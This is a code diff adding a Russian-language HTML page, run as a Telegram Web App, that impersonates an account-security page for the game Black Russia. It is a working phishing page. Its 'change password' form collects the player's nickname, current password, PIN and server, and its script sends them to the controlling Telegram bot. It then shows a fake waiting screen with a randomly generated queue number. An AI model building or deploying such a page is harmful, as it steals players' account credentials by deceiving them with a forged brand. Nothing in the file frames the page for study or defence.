@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Black Russia - Личный Кабинет</title>
+    <!-- Подключаем скрипт Телеграма -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Основной стиль: Черный, Красный, Белый */
+        body {
+            background-color: #0d0d0d;
+            color: #ffffff;
+            font-family: 'Ubuntu', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .screen {
+            display: none; /* Прячем все экраны по умолчанию */
+            flex-direction: column;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .active {
+            display: flex; /* Показываем только активный экран */
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            width: 180px;
+            margin: 0 auto 30px;
+            display: block;
+            filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.5));
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Кнопки */
+        .btn-red {
+            background-color: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 15px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: 0.2s;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .btn-red:active {
+            transform: scale(0.98);
+            background-color: #cc0000;
+        }
+
+        /* Поля ввода */
+        .input-box {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 15px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            text-align: left;
+        }
+
+        .input-box:focus {
+            border-color: #ff0000;
+        }
+
+        label {
+            text-align: left;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 5px;
+            margin-left: 5px;
+        }
+
+        select.input-box {
+            width: 100%;
+            appearance: none;
+        }
+
+        .error-text {
+            color: #ff4444;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        /* Экран ожидания */
+        .queue-number {
+            font-size: 60px;
+            color: #ff0000;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        }
+
+        .wait-text {
+            color: #aaa;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- Экран 1: Стартовый -->
+    <div id="screen1" class="screen active">
+        <img src="https://blackrussia.online/assets/img/logo.png" alt="Black Russia" class="logo">
+        <h1>Безопасность Аккаунта</h1>
+        <p style="color: #888; margin-bottom: 30px;">Система управления доступом Black Russia</p>
+        <button class="btn-red" onclick="goToScreen(2)">Поменять пароль</button>
+    </div>
+
+    <!-- Экран 2: Форма -->
+    <div id="screen2" class="screen">
+        <h2 style="color: #ff0000; text-transform: uppercase;">Смена пароля</h2>
+        <div id="error-msg" class="error-text">Заполните все обязательные поля</div>
+
+        <label>Ваш Никнейм *</label>
+        <input type="text" id="nick" class="input-box" placeholder="Ivan_Ivanov">
+
+        <label>Текущий пароль *</label>
+        <input type="password" id="old_pass" class="input-box" placeholder="Введите пароль">
+
+        <label>Пин-код (если есть)</label>
+        <input type="number" id="pin" class="input-box" placeholder="1234">
+
+        <label>Выберите сервер *</label>
+        <select id="server" class="input-box">
+            <option value="">-- Выберите сервер --</option>
+            <option value="RED">RED</option>
+            <option value="GREEN">GREEN</option>
+            <option value="BLUE">BLUE</option>
+            <option value="CHERRY">CHERRY</option>
+            <option value="ORANGE">ORANGE</option>
+            <option value="BLACK">BLACK</option>
+            <option value="WHITE">WHITE</option>
+            <option value="ICE">ICE</option>
+        </select>
+
+        <label>Новый пароль *</label>
+        <input type="password" id="new_pass" class="input-box" placeholder="Придумайте новый пароль">
+
+        <button class="btn-red" onclick="sendData()">Отправить</button>
+    </div>
+
+    <!-- Экран 3: Ожидание -->
+    <div id="screen3" class="screen">
+        <img src="https://blackrussia.online/assets/img/logo.png" alt="Black Russia" class="logo" style="width: 100px;">
+        <h2 style="margin-bottom: 10px;">Заявка принята</h2>
+        <p class="wait-text">Ожидайте в течение 10–15 минут<br>Ваша очередь:</p>
+        <div id="queue-val" class="queue-number">5</div>
+        <p class="wait-text" style="font-size: 12px;">Не закрывайте это окно до завершения операции</p>
+    </div>
+
+</div>
+
+<script>
+    // Инициализация Telegram Web App
+    let tg = window.Telegram.WebApp;
+    tg.expand(); // Разворачиваем на все окно
+
+    function goToScreen(num) {
+        // Прячем все экраны
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        // Показываем нужный
+        document.getElementById('screen' + num).classList.add('active');
+    }
+
+    function sendData() {
+        // Собираем данные
+        const nick = document.getElementById('nick').value;
+        const old_pass = document.getElementById('old_pass').value;
+        const pin = document.getElementById('pin').value;
+        const server = document.getElementById('server').value;
+        const new_pass = document.getElementById('new_pass').value;
+        const errorMsg = document.getElementById('error-msg');
+
+        // Простая валидация (обязательные поля)
+        if (!nick || !old_pass || !server || !new_pass) {
+            errorMsg.style.display = 'block';
+            return;
+        }
+
+        errorMsg.style.display = 'none';
+
+        // Формируем объект данных
+        const resultData = {
+            nick: nick,
+            old_password: old_pass,
+            pin_code: pin || "Не указан",
+            server: server,
+            new_password: new_pass
+        };
+
+        // Генерируем случайное число для очереди (от 2 до 9)
+        const randomQueue = Math.floor(Math.random() * (9 - 2 + 1)) + 2;
+        document.getElementById('queue-val').innerText = randomQueue;
+
+        // Отправляем данные боту
+        tg.sendData(JSON.stringify(resultData));
+
+        // Переходим на финальный экран
+        goToScreen(3);
+    }
+</script>
+
+</body>
+</html>
